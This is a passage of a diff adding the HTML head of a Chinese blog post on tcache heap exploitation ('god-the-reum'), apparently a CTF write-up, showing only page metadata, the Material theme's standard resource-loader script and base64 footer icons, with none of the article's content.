@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.4.0 -->
+    <script>window.materialVersion = "1.4.0"</script>
+
+    <!-- Title -->
+    
+    <title>
+        
+            Tcache学习-god-the-reum | 
+        
+        iosmosis&#39;s blog
+    </title>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="iosmosis">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="null">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" sizes="192x192" href="/img/favicon.png">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="iosmosis&#39;s blog">
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://iosmosis.github.io">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Tcache学习-god-the-reum | iosmosis&#39;s blog">
+    <meta property="og:image" content="/img/favicon.png" />
+    <meta property="og:description" content="">
+    
+
+    
+        <meta property="article:published_time" content="3月 04, 2019" />
+        <meta property="article:modified_time" content="3月 04, 2019" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="Tcache学习-god-the-reum | iosmosis&#39;s blog">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="/img/favicon.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="http://iosmosis.github.io" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://iosmosis.github.io/2019/03/04/Tcache学习-god-the-reum/index.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "iosmosis&#39;s blog",
+        "logo": "/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "iosmosis",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/favicon.png"
+        },
+        "description": "期待大学生活的二进制菜鸡"
+    },
+    "headline": "Tcache学习-god-the-reum",
+    "url": "http://iosmosis.github.io/2019/03/04/Tcache学习-god-the-reum/index.html",
+    "datePublished": "3月 04, 2019",
+    "dateModified": "3月 04, 2019",
+    "description": "",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://iosmosis.github.io"
+    }
+}
+</script>
+
+
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+materialVersion+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(data&&data.indexOf(versionString)===-1){lsloader.removeLS(key)}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload){cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}code=code.split(versionString)[1];if(/\.js?.+$/.test(versionNumber)){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload)}};lsloader.requestResource=function(name,path,cssonload){var that=this;if(/\.js?.+$/.test(path)){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else if(/\.css?.+$/.test(path)){this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import CSS & jQuery -->
+    
+        <style id="css/material.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/material.min.css","/css/material.min.css?fJTiM/K1J3dWIruo3pxtAw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
+        <style id="css/style.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/style.min.css","/css/style.min.css?oCSEO3ST+aEypEwttTDI9g==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
+        
+        
+            <style>
+    
+    .footer-sns-facebook {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNjU3LjYgODcuOGw0LjggMy44djU1LjJjMCA1NC42IDAgNTUuMi00LjYgNTkuNi00LjQgNC40LTYgNC42LTUwLjIgNS42bC00NS42IDEtNy4yIDUuNmMtMTAuNCA4LTE2LjggMTcuMi0xOS4yIDI3LjQtMSA1LTEuOCAyNC44LTEuOCA0NCAuMiAzOCAxLjYgNDQuNiAxMC44IDQ4IDIuOCAxLjIgMjguNCAyIDU2LjggMiA0Ny44IDAgNTIgLjIgNTYuMiAzLjhsNC44IDMuOHY1NS4yYzAgNTQuNiAwIDU1LjItNC42IDU5LjYtNC40IDQuNi01LjQgNC42LTU3IDUuMi0yOC44LjItNTQuNC44LTU2LjggMS40LTIuNC42LTUuNiAzLTYuOCA1LjQtMS44IDMuMi0yLjQgNDEuNC0yLjYgMTQzLjJsLS4yIDEzOC44LTUuNiA0LjgtNS42IDQuOEg2MDljLTUyLjQgMC01Mi44IDAtNTguMi00LjZsLTUuNC00LjYtLjItMTQwLjYtLjItMTQwLjYtNC44LTMuOGMtNC4yLTMuNC04LTMuOC0zNS42LTMuOC0zMi44IDAtNDEtMS44LTQzLjYtMTAtLjYtMi4yLTEuMi0yNS40LTEuMi01MS40IDAtNjAuOC0uMi01NyAzLjQtNjEuNiAyLjgtMy42IDYtNCAzNy44LTUgMzMtMSAzNS4yLTEuMiAzOS40LTUuNiA0LjYtNC40IDQuNi01LjIgNS44LTcxIDEuMi03My40LjItNjcuMiAxNi42LTk5LjQgOC0xNS44IDEyLjgtMjIgMjgtMzcgMTUuMi0xNS4yIDIxLjQtMTkuNiAzOC4yLTI4IDExLTUuNCAyNC0xMSAyOS0xMi4yIDYuMi0xLjggMjguNi0yLjYgNzEuMi0yLjYgNTguNi0uMiA2Mi42IDAgNjcgMy42eiIvPjwvc3ZnPg==);
+    }
+    
+    
+    .footer-sns-twitter {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNTMyLjggMjA1YzEwIDQgMjMgMTAuOCAyOC44IDE1LjIgMTIuNiA5LjIgMTYuNiAxMC42IDI5LjQgOS40IDYuNi0uNiAxMy0zLjIgMjAuNC04LjIgMTEuMi03LjYgMTkuNC05LjIgMjMuNi01IDMuNiAzLjYgMi44IDktMi44IDE4LjYtNy4yIDEyLjQtNiAxOC44IDQuMiAyNC4yIDQuNCAyLjIgOC4yIDUuNiA4LjYgNy40IDEgNC44LTEyLjYgMjQuMi0yMiAzMS44LTExLjggOS4yLTE3LjIgMjIuNi0xOS42IDQ3LjgtNC44IDUwLjQtNy44IDY2LjYtMTYuNCA4NS40LTMgNy03IDE3LjgtOC44IDI0LTEuOCA2LjQtNSAxNC42LTcuNCAxOC40LTIuMiAzLjgtNy40IDEzLTExLjQgMjAuNC0xNy4yIDMwLjgtNDMuNCA2MS40LTcxLjQgODMuOC0yNS42IDIwLjQtNDYgMzMuMi02NC4yIDQwLjItOC40IDMuMi0xOCA3LjYtMjEuNCA5LjYtNy40IDQuNi0yMi40IDguNi01Ny4yIDE1LTYyLjIgMTEuNi03OS4yIDExLjQtMTM1LjYtMS0zMi40LTctMzguNi05LTUyLTE2LjgtMjEuNC0xMi42LTI0LjItMTQuOC0yNC4yLTE5LjQgMC02LjIgMTAuMi05LjIgMzUtMTAuNCAyMi40LTEgMjguNi0yLjYgNTctMTQuMiAyMy44LTkuOCAyOS40LTEyLjggMzAuNC0xNi44IDIuMi04LjItMy0xMy4yLTI2LjgtMjUuNC0yNS44LTEzLjItMzIuMi0xOC40LTQzLjgtMzUuOC05LTEzLjYtMTAtMjEuMi0zLjYtMzMuNiA1LjQtMTAuOCAzLjYtMTUtMTEuOC0yNS40LTktNi0xNC0xMS42LTIwLjgtMjIuNi0yMy40LTM3LjgtMjUtNTAuOC03LjItNTkuOCA0LjgtMi40IDkuNC01LjQgMTAuMi02LjYgMi44LTQuMi0uNC0xNS42LTguNC0yOS0xMS42LTE5LjYtMTMuMi0yNS44LTEzLjItNTUuMiAwLTI4LjggMi42LTM3LjggMTItNDAuMiA5LTIuMiAxNC44IDEgMzUuNiAyMC4yIDI0LjggMjIuOCA0My42IDM2LjYgNjIuOCA0NS44IDggMy44IDE3LjggOS4yIDIyIDEyIDQuMiAyLjggMTQuOCA3IDIzLjQgOS4yIDguNiAyLjIgMjQuMiA2LjggMzQuOCAxMC4yIDEzLjQgNC40IDIzLjYgNi40IDMzIDYuNiAxMi44LjIgMTQuMi0uMiAxOC42LTUuNCA0LTQuOCA0LjgtNy44IDQuOC0xOS4yIDAtMTQuNCA1LjYtMzkuNiAxMS4yLTUwLjYgNC4yLTguNCAyOS4yLTM0LjIgMzkuOC00MS40IDcuOC01LjQgMzUuNi0xNiA1Mi0yMCAxNC4yLTMuNiAzMi42LTEuMiA1Mi40IDYuOHoiLz48L3N2Zz4=);
+    }
+    
+    
+    .footer-sns-gplus {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHpNNDMwIDI5NS40YzQwLjYgMTUuNCA1Ni42IDIzLjggNzIuNiAzOC40IDYuOCA2LjIgNy4yIDE1LjIgMSAyMy40LTYuMiA4LTMzLjYgMzMuOC0zOSAzNi42LTUuNiAyLjgtMTcuNiAyLjgtMjMuMi0uMi0yLjQtMS4yLTguMi01LjItMTMtOC44LTExLjItOC42LTI0LjYtMTEuMi01NS4yLTExLjItMjcuNCAwLTQwLjYgMi42LTUyLjIgMTAuNC00LjQgMi44LTEyLjIgNy42LTE3LjIgMTAuNi0yMyAxMy4yLTUxLjQgNTUtNTUuOCA4Mi40LTIuNiAxNS42LTIuNCAzNC44LjIgNTEgMi44IDE3LjQgMTkuOCA0OC44IDM1LjIgNjUuMiAxNiAxNi42IDQ1IDMzLjYgNjIuOCAzNi42IDI2LjggNC40IDY1LjggMS42IDc5LjQtNS44IDIwLjYtMTEuNCAzMS0xOSA0MS0zMC40IDE4LjgtMjEuNiAyMy40LTM0LjIgMTUuNi00My44LTMuOC00LjgtNC40LTQuOC01MS01LjgtNjAuOC0xLjItNTYuMiAyLjItNTYuMi00My4yIDAtMzIuNC4yLTMzLjIgNC44LTM3IDQuNC0zLjYgOS0zLjggOTItMy44IDc5IDAgODcuOC40IDk0LjIgMy42IDExLjIgNS42IDEzIDExLjQgMTIuOCA0My40IDAgMjUuNC0uOCAzMC44LTcuNiA1OC00IDE2LjYtOS44IDM0LTEyLjYgMzktMi44IDUtOC4yIDE0LjItMTEuNiAyMC42LTguNCAxNS40LTI3LjIgMzYuOC00MC44IDQ2LjYtNS44IDQuNC0xMy44IDEwLjItMTcuNiAxMy4yLTMuOCAzLTExIDctMTYuMiA4LjgtNS4yIDEuOC0xNi4yIDYuNC0yNC40IDEwLTIyLjQgOS42LTM0LjggMTEuNi03MyAxMS42LTM3LjYuMi00Ny0xLjQtNzEtMTItOC4yLTMuNi0xNy42LTcuMi0yMC44LTgtMTUuOC0zLjgtNjctNDUuMi03Ny44LTYyLjgtMi4yLTMuOC03LjYtMTEuNi0xMS44LTE3LjItNC4yLTUuNC05LTE0LTEwLjYtMTktMS44LTQuOC02LjItMTYtMTAtMjQuOC0zLjYtOC44LTcuOC0yMi4yLTkuMi0yOS42LTMuMi0xOC44LTEuNC03OS40IDIuOC05MS40IDEzLjgtNDAuNiAzNS42LTc4IDU4LjgtMTAwLjIgMTQtMTMuNiA0Ny4yLTM2LjQgNTgtMzkuOCA0LjItMS40IDEzLjQtNS4yIDIwLjYtOC40IDIyLTEwIDMyLjgtMTEuNiA3Ni0xMSAzMy44LjYgNDAuNCAxLjIgNTAgNC44em0zNDAuOCA4MC44YzggMy42IDkuNiAxMS4yIDkuMiAzOS4yLS42IDM0LjQtLjYgMzQgNSAzOS42IDQuOCA1IDUuNCA1IDM3LjYgNSA0My40IDAgNDQuNC44IDQzLjIgMzYuMi0uOCAxNy0xLjIgMTguNC02LjQgMjMtNS40IDQuNi02LjYgNC44LTM3LjYgNC44LTMxLjIgMC0zMiAuMi0zNi44IDUtNS42IDUuNC01LjYgNC40LTUgNDEuMi40IDI2LjQuMiAyNy40LTQuNiAzMy00LjggNS42LTYgNS44LTI0LjQgNi40LTIwLjguOC0yOS42LTEuNC0zMy40LTguNC0xLjQtMi42LTItMTUuNi0xLjgtMzUuNi40LTMxLjIuNC0zMS42LTQuNi0zNi42cy01LjYtNS0zNi01Yy0xOC44IDAtMzMtLjgtMzYtMi4yLTcuNi0zLjYtOS42LTExLjItOC44LTMzLjguOC0yOC4yLjQtMjggNDEtMjggNDUuNCAwIDQ1LjQgMCA0NC42LTQyLjYtLjYtMzMtLjYtMzMgNS0zOC40IDQuNC00LjYgNi4yLTUgMjQuOC01IDExIDAgMjIuMiAxIDI1IDIuMnoiLz48L3N2Zz4=);
+    }
+    
+    
+    .footer-sns-weibo {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzUuMiA3OWMtOC42IDMtMjIuOCAxMi40LTMyLjggMjEuOC04LjIgNy44LTIyLjIgMzEtMjQuNiA0MC42LTEgNC4yLTEuNiAxNjctMS42IDM2NC42IDAgMjg0LjguNCAzNTguNCAyLjYgMzY0IDEuNCAzLjggNi44IDEzIDEyIDIwLjQgOC44IDEyLjggMjQgMjUuNCA0MS44IDM1IDYgMy40IDI3IDMuNiAzNjcuNCAzLjYgMjg2LjIgMCAzNjIuNi0uNiAzNjktMi42IDE5LjgtNi4yIDUxLjItMzcuNiA1Ny40LTU3LjQgMi02LjQgMi42LTgyLjYgMi42LTM2OFYxNDFsLTQuMi05Yy0xMS42LTI0LTM5LjItNDkuOC01OC4yLTU0LjItNC4yLTEtMTY4LjYtMS42LTM2NS42LTEuNi0zMDAgMC0zNTkuMi40LTM2NS44IDIuOHptNTU4LjYgMTY5YzguNiAxLjIgMTYuNCA0IDI0IDguNiA2LjIgMy42IDE1LjIgOC4yIDIwLjIgMTAuMiA1LjggMi4yIDE0LjYgOC44IDI1IDE4LjggMjUuNCAyNC44IDMyLjggMzQuOCAzNy44IDUxIDIuNiA4IDcuNCAxOS44IDEwLjggMjYuNCA3LjggMTQuNiAxMS42IDQyLjYgOS40IDY5LTEgMTQuMi0yLjIgMTguNi03LjQgMjYuNC0zLjIgNS4yLTkgMTIuMi0xMi44IDE1LjYtMTMuOCAxMi0zNCA1LjgtMzguOC0xMi0xLjYtNi0xLjQtMTEuNCAxLjItMjMuNCA0LjItMjAgMy00Ni0yLjYtNTguNi0yLjItNS04LTEyLjYtMTIuOC0xNi44LTQuOC00LjItMTQuNi0xNi40LTIxLjgtMjYuOC03LjItMTAuNi0xNS4yLTIwLjgtMTgtMjIuOC0yLjgtMi0xMi42LTYtMjItOS0xNC40LTQuNC0yMC44LTUuNC00My01LjYtMjgtLjItMzEuNC0xLjItNDIuNC0xMS42LTcuNC03LTguNi0xNS42LTMuOC0yNS4yIDctMTMuMiAxNi40LTE2IDU0LjItMTYgMTYuNiAwIDM1LjguOCA0Mi44IDEuOHptLTIxMy42IDc1LjZjMjAuMiAxNS40IDIwLjYgMTYuNCAyMiA0OCAuNiAxNSAxLjggMjkgMi42IDMxIDIuOCA2LjIgMTEgNi42IDIxLjYuNiA1LjQtMy4yIDE0LTUuOCAyMC02LjQgNS44LS42IDE4LjgtMi40IDI5LTQuMiAxNy4yLTMgMTkuNC0zIDM2IC40IDMyIDYuNiAzNS44IDkuMiA0NC4yIDMxLjYgNS4yIDE0IDUuNCAyMS40IDEuMiAzMi44LTIuMiA1LjQtMi44IDExLTIgMTUuNCAxLjggMTAgMTcuNiAyMy40IDM1IDMwLjIgMTEuMiA0LjIgMTYuMiA3LjYgMjcgMTkgMTkuMiAxOS44IDIwLjIgMjMgMjAgNTktLjIgMzUtLjQgMzUuNC0xOS44IDYzLjYtMTMuOCAxOS44LTMyLjQgMzguNi00OSA1MC01IDMuNC0xMi4yIDguOC0xNS44IDEyLTMuOCAzLjItMTEuNiA4LTE3LjIgMTAuNC01LjYgMi42LTE0LjYgNy40LTE5LjggMTAuNi01LjIgMy40LTE1LjggNy42LTIzLjggOS40LTggMi0yMS4yIDYuNi0yOS42IDEwLjItMjIuNCAxMC0zNi4yIDExLjItMTIxLjggMTAuNGwtNzUtLjYtMTktOC40Yy0xMC42LTQuNi0yNS40LTkuOC0zMy0xMS42LTcuNi0xLjYtMTgtNS44LTIzLTlzLTE0LjItOC0yMC40LTEwLjhjLTE4LTgtNTkuNC00Ni4yLTY2LTYxLjItMi4yLTUtNy40LTE0LjQtMTEuNC0yMC44bC03LjItMTJWNTQ5bDcuNi0xMy42YzQuMi03LjQgOS40LTE4LjYgMTEuNi0yNC44IDMuOC0xMS40IDEzLjQtMjcuOCAyNC44LTQyLjYgMjAuMi0yNi4yIDM4LjQtNDYuOCA1My02MCA5LjItOC4yIDIxLTE4LjYgMjYtMjMuMiA1LTQuNCAxMy4yLTExIDE4LjYtMTQuNiA1LjItMy40IDkuNC03LjIgOS40LTggMC0xIDUuNi00LjYgMTIuNi04LjIgNi44LTMuOCAxNi40LTkuNiAyMS40LTEzLjIgNS0zLjYgMTQuNC04IDIxLTkuOCA2LjYtMiAxNy44LTYuNiAyNS0xMC4yIDEyLTYuMiAxNC40LTYuOCAzMi40LTYuOGgxOS40bDEyLjQgOS42em0yMDMuNiAxMy4yYzMgMS42IDYuNiA0LjQgOCA2IDEuNiAxLjggOS40IDcgMTcuNCAxMS42IDE3IDkuNiAxOSAxMyAyNCA0MiAzLjQgMjAuNCAyLjYgMzIuMi0zLjQgNDMuOC03LjYgMTUuMi0yMi44IDIwLjYtMzEuMiAxMS4yLTctNy42LTkuMi0xMy44LTEwLjYtMjkuNi0xLjItMTMuMi0yLjQtMTYuNC05LjYtMjcuMi0xMS0xNi0xNi44LTIwLjYtMjcuMi0yMC42LTEwIDAtMjQtNi4yLTI3LTExLjYtNS44LTEwLjguNC0yNC42IDEyLjQtMjguNCA4LjYtMi42IDQwLjItLjggNDcuMiAyLjh6Ii8+PHBhdGggZD0iTTQyNCA0NzcuNGMtMzIuNiAzLjYtNDcuOCA3LTYxLjggMTMuOC04IDQtMTkgOC40LTI0LjIgMTAtNS4yIDEuNi0xMi40IDUtMTYuMiA3LjgtMy44IDIuNi0xMSA3LjYtMTYuMiAxMS0xMy40IDguOC0zNSAzMy4yLTM4LjggNDQtMS44IDUtNS40IDE0LjQtOC4yIDIxLTguOCAyMS4yLTguMiAyNi44IDQgNTMgMTAuNiAyMi42IDExIDIzLjIgMjcuNiAzNi40IDIxIDE2LjggMjMuNiAxOC40IDUwLjggMjguMiAyMC4yIDcuMiAyNC42IDggNTQgMTAgMTcuNiAxLjIgNDUuNiAyLjIgNjIgMi4ybDMwIC4yIDE3LjQtOC40YzkuNi00LjYgMjIuNC05LjYgMjguMi0xMS40IDYtMS44IDE1LjQtNi4yIDIwLjgtMTAgNS40LTMuNiAxMy40LTguNiAxNy42LTEwLjggOS4yLTQuNiAzOS0zNC40IDM5LTM5IDAtMS42IDMuOC0xMC4yIDguNC0xOC44IDcuOC0xNC4yIDguNi0xNi44IDguNC0yOS42LS4yLTEyLjgtMS0xNS44LTEwLjYtMzQuNi0xMy40LTI2LjItMzAuNC00My42LTUwLjItNTEuNC03LjI